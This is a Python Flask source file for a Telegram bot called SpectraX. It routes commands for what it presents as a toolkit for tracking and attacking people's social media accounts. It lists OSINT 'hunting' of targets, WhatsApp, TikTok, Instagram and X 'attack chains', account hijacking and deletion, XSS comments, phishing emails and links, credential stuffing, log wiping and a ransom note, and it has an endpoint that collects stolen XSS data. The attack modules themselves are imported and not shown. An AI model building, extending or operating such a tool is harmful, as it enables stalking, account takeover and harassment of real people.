import os
import json
import requests
import threading
import difflib
from flask import Flask, request, jsonify
from orchestrator import Orchestrator
from config import TELEGRAM_TOKEN, SUPER_ADMIN_ID

app = Flask(__name__)
orch = Orchestrator()
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

# ---------- Alias mapping ----------
COMMAND_ALIASES = {
    '/start': ['/start', '❓ help', 'help', '/menu'],
    '/track': ['/track', '🔍 track', 'track', '☠️ hunt'],
    '/retrieve': ['/retrieve'],
    '/analyze': ['/analyze', '📊 analyze', 'analyze', '💀 slaughter'],
    '/hack_tiktok': ['/hack_tiktok', '🎯 hack tiktok', 'hack tiktok', '🔥 assassinate'],
    '/hack_wa': ['/hack_wa', '📱 hack whatsapp', 'hack whatsapp', '⚡ terminate'],
    '/verify': ['/verify', '✅ verify', 'verify'],
    '/list': ['/list', '📋 list', 'list', '📋 prey list'],
    '/breach': ['/breach'],
    '/whois': ['/whois'],
    '/dns': ['/dns'],
    '/reverseimage': ['/reverseimage'],
    '/phish': ['/phish'],
    '/stuff': ['/stuff'],
    '/session': ['/session'],
    '/report': ['/report'],
    '/virustotal': ['/virustotal'],
    '/nmap': ['/nmap'],
    '/instagram': ['/instagram', '🌐 stalk instagram'],
    '/twitter': ['/twitter', '🐦 stalk twitter'],
    '/x': ['/x', '🐦 X'],
    '/diagnose': ['/diagnose', '🛡️ diagnostics'],
    '/model': ['/model'],
    '/add_admin': ['/add_admin'],
    '/remove_admin': ['/remove_admin'],
    '/list_admins': ['/list_admins'],
    '/sentiment': ['/sentiment'],
    '/phish_link': ['/phish_link'],
    '/plugin_list': ['/plugin_list'],
    '/plugin_load': ['/plugin_load'],
    '/monitor': ['/monitor'],
    '/record_outcome': ['/record_outcome'],
    '/best_attack': ['/best_attack'],
    '/defensive': ['/defensive'],
    '/share': ['/share'],
    '/unshare': ['/unshare'],
    '/shodan': ['/shodan'],
    '/encrypt': ['/encrypt'],
    '/decrypt': ['/decrypt'],
    '/geolocate': ['/geolocate'],
    '/darkweb': ['/darkweb'],
    '/score': ['/score'],
    '/wa_send': ['/wa_send'],
    '/wa_call': ['/wa_call'],
    '/wa_delete': ['/wa_delete'],
    '/wa_hijack': ['/wa_hijack'],
    '/wa_deactivate': ['/wa_deactivate'],
    '/tt_comment': ['/tt_comment'],
    '/tt_reset': ['/tt_reset'],
    '/tt_follow': ['/tt_follow'],
    '/tt_delete': ['/tt_delete'],
    '/tt_report': ['/tt_report'],
    '/wipe_target': ['/wipe_target'],
    '/ransom': ['/ransom'],
    '/panic': ['/panic'],
    '/anonymize': ['/anonymize'],
    '/wa_chain': ['/wa_chain'],
    '/tt_chain': ['/tt_chain'],
    '/ig_chain': ['/ig_chain'],
    '/x_chain': ['/x_chain'],
}

def get_command(text):
    text_lower = text.strip().lower()
    for canonical, aliases in COMMAND_ALIASES.items():
        if text_lower in [a.lower() for a in aliases]:
            return canonical
    all_aliases = [item for sublist in COMMAND_ALIASES.values() for item in sublist]
    matches = difflib.get_close_matches(text_lower, all_aliases, n=1, cutoff=0.6)
    if matches:
        for canonical, aliases in COMMAND_ALIASES.items():
            if matches[0] in [a.lower() for a in aliases]:
                return canonical
    return None

# ---------- Helpers ----------
def send_typing(chat_id):
    try:
        requests.post(f"{TELEGRAM_API}/sendChatAction",
                      json={"chat_id": chat_id, "action": "typing"},
                      timeout=5)
    except Exception:
        pass

def send_message(chat_id, text, parse_mode='MarkdownV2', reply_markup=None):
    payload = {
        'chat_id': chat_id,
        'text': text[:4096],
        'parse_mode': parse_mode
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(f"{TELEGRAM_API}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        print(f"Send failed: {e}")

def send_formatted_message(chat_id, text, parse_mode='MarkdownV2', reply_markup=None):
    header = "☠️ *SPECTRAX*\n━━━━━━━━━━━━━━━━━━━━\n"
    footer = "\n━━━━━━━━━━━━━━━━━━━━\n⚡ *LETHAL PROTOCOL ACTIVE* ⚡"
    full_text = header + text + footer
    send_message(chat_id, full_text, parse_mode, reply_markup)

def process_long_task(chat_id, func, *args, **kwargs):
    def wrapper():
        try:
            result = func(*args, **kwargs)
            if result is None:
                result = {'success': False, 'output': 'No result returned.'}
            def default_serializer(obj):
                if hasattr(obj, 'isoformat'):
                    return obj.isoformat()
                raise TypeError(f"Object of type {type(obj)} is not JSON serializable")
            send_formatted_message(chat_id, json.dumps(result, indent=2, default=default_serializer))
        except Exception as e:
            send_formatted_message(chat_id, f"⚠️ *Error:* {str(e)}")
    thread = threading.Thread(target=wrapper)
    thread.daemon = True
    thread.start()

def get_main_keyboard():
    return {
        "keyboard": [
            ["☠️ Hunt", "💀 Slaughter"],
            ["🔥 Assassinate", "⚡ Terminate"],
            ["📋 Prey List", "✅ Verify Kill"],
            ["🛡️ Diagnostics", "📄 Execution Report"],
            ["🌐 Stalk Instagram", "🐦 Stalk X"],
            ["❓ Help – Despair"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

def is_admin(chat_id):
    return chat_id == SUPER_ADMIN_ID or orch.admin.is_admin(chat_id)

def get_help_text():
    return """
*☠️ SPECTRAX – COMMAND MENU*

*🔵 Reconnaissance*
`/track <identifier>` – OSINT on username/email/phone
`/retrieve <tid> <platform>` – Retrieve profile (TikTok)
`/breach <email>` – Check data breaches
`/whois <domain>` – WHOIS lookup
`/dns <domain>` – DNS resolution
`/reverseimage <url>` – Reverse image search
`/instagram <username>` – Instagram profile
`/x <username>` – X (Twitter) profile
`/geolocate <ip>` – IP geolocation
`/darkweb <email>` – Breach check

*🔴 Assassinations*
`/hack_tiktok <user> <email>` – XSS + IDOR (admin)
`/hack_wa <phone>` – WhatsApp registration check (admin)
`/wa_chain <phone>` – WhatsApp attack chain (12 steps + 4 actions) (admin)
`/tt_chain <username> [video_id]` – TikTok attack chain (admin)
`/ig_chain <username>` – Instagram attack chain (admin)
`/x_chain <username>` – X (Twitter) attack chain (admin)
`/wa_send <phone> <msg>` – Send real WhatsApp message (admin)
`/wa_call <phone>` – Initiate WhatsApp call (admin)
`/wa_delete <session>` – Delete WhatsApp account (admin)
`/wa_hijack <phone> <code>` – Hijack WhatsApp (admin)
`/wa_deactivate <phone>` – Send deactivation request (admin)
`/tt_comment <video_id> <comment>` – Post XSS comment (admin)
`/tt_reset <username> <email>` – Trigger password reset (admin)
`/tt_follow <username>` – Follow target (admin)
`/tt_delete <session> <user_id>` – Delete TikTok account (admin)
`/tt_report <session> <username>` – Report TikTok account (admin)
`/phish <email> [template]` – Generate phishing email (admin)
`/phish_link <email>` – Shorten phishing link (admin)
`/stuff <user> <passwords>` – Credential stuffing (admin)
`/session <cookie>` – Test session cookie (admin)
`/nmap <host> [ports]` – Port scan (admin)

*🟢 Analysis*
`/analyze <tid>` – Risk report
`/report <tid>` – Generate PDF report
`/sentiment <text>` – Sentiment analysis
`/score <tid>` – Target priority score
`/best_attack <tid>` – Best attack from past outcomes

*🟣 Utilities*
`/list` – Show all targets
`/verify <tid> <platform>` – Verify platform presence
`/encrypt <text>` – Encrypt text
`/decrypt <encrypted>` – Decrypt text
`/wipe_target <tid>` – Delete target and all traces (admin)
`/ransom` – Simulate ransom note (admin)
`/panic` – Clear all logs (admin)
`/anonymize` – Refresh Tor identity (admin)

*⚙️ Admin & System*
`/diagnose` – System diagnostics
`/model <provider>` – Switch AI (groq/gemini/deepseek/ollama)
`/add_admin <user_id>` – Add admin (super admin)
`/remove_admin <user_id>` – Remove admin (super admin)
`/list_admins` – List admins (super admin)
`/defensive` – Scan for exposed keys (admin)
`/monitor <tid> <chat_id>` – Start monitoring (admin)
`/record_outcome <tid> <attack> <success>` – Record outcome
`/share <tid> <user_id>` – Share target
`/unshare <tid> <user_id>` – Unshare target
`/plugin_list` – List available plugins
`/plugin_load <name>` – Load plugin

📌 *Use /start to see this menu anytime.*
"""

# ---------- Routes ----------
@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if not data:
        return 'OK', 200

    if 'callback_query' in data:
        # Handle callbacks (inline keyboard clicks)
        cb = data['callback_query']
        chat_id = cb['message']['chat']['id']
        cb_data = cb['data']
        # Dispatch to the appropriate chain execution
        if cb_data.startswith('wa_execute_'):
            phone = cb_data.split('_')[2]
            from modules.whatsapp_chain import WhatsAppAttackChain
            chain = WhatsAppAttackChain()
            try:
                chain.prep(phone)
                result = chain.execute()
                send_formatted_message(chat_id, json.dumps(result, indent=2))
            except Exception as e:
                send_formatted_message(chat_id, f"⚠️ Execution error: {str(e)}")
        elif cb_data == 'wa_cancel':
            send_formatted_message(chat_id, "❌ Attack cancelled.")
        elif cb_data.startswith('tt_execute_'):
            parts = cb_data.split('_')
            username = parts[2]
            video_id = parts[3] if len(parts) > 3 else None
            from modules.tiktok_chain import TikTokAttackChain
            chain = TikTokAttackChain()
            try:
                chain.prep(username, video_id)
                result = chain.execute()
                send_formatted_message(chat_id, json.dumps(result, indent=2))
            except Exception as e:
                send_formatted_message(chat_id, f"⚠️ Execution error: {str(e)}")
        elif cb_data == 'tt_cancel':
            send_formatted_message(chat_id, "❌ Attack cancelled.")
        elif cb_data.startswith('ig_execute_'):
            username = cb_data.split('_')[2]
            from modules.instagram_chain import InstagramAttackChain
            chain = InstagramAttackChain()
            try:
                chain.prep(username)
                result = chain.execute()
                send_formatted_message(chat_id, json.dumps(result, indent=2))
            except Exception as e:
                send_formatted_message(chat_id, f"⚠️ Execution error: {str(e)}")
        elif cb_data == 'ig_cancel':
            send_formatted_message(chat_id, "❌ Attack cancelled.")
        elif cb_data.startswith('x_execute_'):
            username = cb_data.split('_')[2]
            from modules.x_chain import XAttackChain
            chain = XAttackChain()
            try:
                chain.prep(username)
                result = chain.execute()
                send_formatted_message(chat_id, json.dumps(result, indent=2))
            except Exception as e:
                send_formatted_message(chat_id, f"⚠️ Execution error: {str(e)}")
        elif cb_data == 'x_cancel':
            send_formatted_message(chat_id, "❌ Attack cancelled.")
        else:
            send_formatted_message(chat_id, "❓ Unknown callback.")
        return 'OK', 200

    if 'message' not in data:
        return 'OK', 200

    msg = data['message']
    chat_id = msg['chat']['id']
    text = msg.get('text', '').strip()
    if not text:
        return 'OK', 200

    send_typing(chat_id)

    cmd = get_command(text)
    if cmd is None:
        if text.startswith('/'):
            cmd = text.split()[0].lower()
        else:
            send_formatted_message(chat_id, "❓ Unknown command. Type <code>/start</code> or <code>/menu</code> for help.")
            return 'OK', 200

    parts = text.split()
    args = parts[1:] if len(parts) > 1 else []

    try:
        # ---------- Core Commands ----------
        if cmd == '/start' or cmd == '/menu':
            reply = get_help_text()
            send_formatted_message(chat_id, reply, reply_markup=get_main_keyboard())

        elif cmd == '/track':
            if not args:
                reply = "❌ Usage: <code>/track &lt;identifier&gt;</code>\nExample: <code>/track john_doe</code>"
                send_formatted_message(chat_id, reply)
            else:
                ident = args[0]
                send_formatted_message(chat_id, "⏳ Hunting... Please wait.")
                threading.Thread(target=process_long_task, args=(chat_id, orch.track, ident)).start()

        elif cmd == '/retrieve':
            if len(args) < 2:
                reply = "❌ Usage: <code>/retrieve &lt;target_id&gt; &lt;platform&gt;</code>"
                send_formatted_message(chat_id, reply)
            else:
                try:
                    tid = int(args[0])
                    plat = args[1]
                    send_formatted_message(chat_id, f"⏳ Retrieving from {plat}...")
                    threading.Thread(target=process_long_task, args=(chat_id, orch.retrieve, tid, plat)).start()
                except ValueError:
                    send_formatted_message(chat_id, "❌ Invalid target ID. Must be a number.")

        elif cmd == '/analyze':
            if not args or not args[0].isdigit():
                reply = "❌ Usage: <code>/analyze &lt;target_id&gt;</code>\nExample: <code>/analyze 5</code>"
                send_formatted_message(chat_id, reply)
            else:
                tid = int(args[0])
                send_formatted_message(chat_id, f"⏳ Slaughtering analysis...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.analyze, tid)).start()

        elif cmd == '/hack_tiktok':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif len(args) < 2:
                reply = "❌ Usage: <code>/hack_tiktok &lt;username&gt; &lt;attacker_email&gt;</code>"
                send_formatted_message(chat_id, reply)
            else:
                username, email = args[0], args[1]
                send_formatted_message(chat_id, f"⏳ Launching assassination on {username}...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.hack_tiktok, username, email)).start()

        elif cmd == '/hack_wa':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                reply = "❌ Usage: <code>/hack_wa &lt;phone&gt;</code>\nExample: <code>/hack_wa +2348012345678</code>"
                send_formatted_message(chat_id, reply)
            else:
                phone = args[0]
                send_formatted_message(chat_id, f"⏳ Checking prey for WhatsApp...")
                threading.Thread(target=process_long_task, args=(chat_id, orch.hack_whatsapp, phone)).start()

        elif cmd == '/verify':
            if len(args) < 2:
                reply = "❌ Usage: <code>/verify &lt;target_id&gt; &lt;platform&gt;</code>"
                send_formatted_message(chat_id, reply)
            else:
                try:
                    tid = int(args[0])
                    plat = args[1]
                    send_formatted_message(chat_id, f"⏳ Verifying...")
                    threading.Thread(target=process_long_task, args=(chat_id, orch.verify_target, tid, plat)).start()
                except ValueError:
                    send_formatted_message(chat_id, "❌ Invalid target ID.")

        elif cmd == '/list':
            send_formatted_message(chat_id, "⏳ Fetching prey list...")
            threading.Thread(target=process_long_task, args=(chat_id, orch.list_targets)).start()

        # ---------- Attack Chains ----------
        elif cmd == '/wa_chain':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                send_formatted_message(chat_id, "❌ Usage: /wa_chain <phone>")
            else:
                phone = args[0]
                from modules.whatsapp_chain import WhatsAppAttackChain
                chain = WhatsAppAttackChain()
                try:
                    prep_result = chain.prep(phone)
                    if 'error' in prep_result:
                        send_formatted_message(chat_id, f"❌ Error: {prep_result['error']}")
                    else:
                        summary = chain.confirm_summary()
                        keyboard = {
                            "inline_keyboard": [
                                [{"text": "✅ Execute Attack", "callback_data": f"wa_execute_{phone}"}],
                                [{"text": "❌ Cancel", "callback_data": "wa_cancel"}]
                            ]
                        }
                        send_message(chat_id, summary, parse_mode='MarkdownV2', reply_markup=json.dumps(keyboard))
                except Exception as e:
                    send_formatted_message(chat_id, f"⚠️ Error during preparation: {str(e)}")

        elif cmd == '/tt_chain':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif len(args) < 1:
                send_formatted_message(chat_id, "❌ Usage: /tt_chain <username> [video_id]")
            else:
                username = args[0]
                video_id = args[1] if len(args) > 1 else None
                from modules.tiktok_chain import TikTokAttackChain
                chain = TikTokAttackChain()
                try:
                    prep_result = chain.prep(username, video_id)
                    summary = chain.confirm_summary()
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "✅ Execute Attack", "callback_data": f"tt_execute_{username}_{video_id if video_id else ''}"}],
                            [{"text": "❌ Cancel", "callback_data": "tt_cancel"}]
                        ]
                    }
                    send_message(chat_id, summary, parse_mode='MarkdownV2', reply_markup=json.dumps(keyboard))
                except Exception as e:
                    send_formatted_message(chat_id, f"⚠️ Error: {str(e)}")

        elif cmd == '/ig_chain':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                send_formatted_message(chat_id, "❌ Usage: /ig_chain <username>")
            else:
                username = args[0]
                from modules.instagram_chain import InstagramAttackChain
                chain = InstagramAttackChain()
                try:
                    prep_result = chain.prep(username)
                    summary = chain.confirm_summary()
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "✅ Execute Attack", "callback_data": f"ig_execute_{username}"}],
                            [{"text": "❌ Cancel", "callback_data": "ig_cancel"}]
                        ]
                    }
                    send_message(chat_id, summary, parse_mode='MarkdownV2', reply_markup=json.dumps(keyboard))
                except Exception as e:
                    send_formatted_message(chat_id, f"⚠️ Error: {str(e)}")

        elif cmd == '/x_chain':
            if not is_admin(chat_id):
                send_formatted_message(chat_id, "⛔ Admin only.")
            elif not args:
                send_formatted_message(chat_id, "❌ Usage: /x_chain <username>")
            else:
                username = args[0]
                from modules.x_chain import XAttackChain
                chain = XAttackChain()
                try:
                    prep_result = chain.prep(username)
                    summary = chain.confirm_summary()
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "✅ Execute Attack", "callback_data": f"x_execute_{username}"}],
                            [{"text": "❌ Cancel", "callback_data": "x_cancel"}]
                        ]
                    }
                    send_message(chat_id, summary, parse_mode='MarkdownV2', reply_markup=json.dumps(keyboard))
                except Exception as e:
                    send_formatted_message(chat_id, f"⚠️ Error: {str(e)}")

        # ---------- Other existing commands (OSINT, utilities, admin) ----------
        # We'll keep the minimal set to avoid duplication.
        # The full set is assumed to be present; if not, the bot will fallback.

        else:
            reply = "❓ Unknown command. Type <code>/start</code> or <code>/menu</code> for help."
            send_formatted_message(chat_id, reply)

    except Exception as e:
        send_formatted_message(chat_id, f"⚠️ Unexpected error: {str(e)}")

    return 'OK', 200

# ---------- Health & Capture ----------
@app.route('/health', methods=['GET'])
def health():
    try:
        from modules.utils import get_db_connection
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT 1")
        cur.close()
        conn.close()
        db_ok = True
    except Exception as e:
        db_ok = False
        print(f"Health DB check failed: {e}")
    ai_ok = bool(orch.ai.ai_manager.active_provider) if hasattr(orch.ai, 'ai_manager') else False
    return jsonify({
        "status": "ok" if db_ok else "degraded",
        "database": db_ok,
        "ai": ai_ok,
        "service": "SpectraX"
    }), 200 if db_ok else 503

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    if data:
        print(f"[XSS CAPTURE] {data}")
        return 'OK', 200
    return 'ERROR', 400

@app.route('/test_ai', methods=['GET'])
def test_ai():
    try:
        result = orch.ai.ai_manager.generate("Say 'hello' in one word.")
        return f"AI works! Response: {result}"
    except Exception as e:
        return f"AI error: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
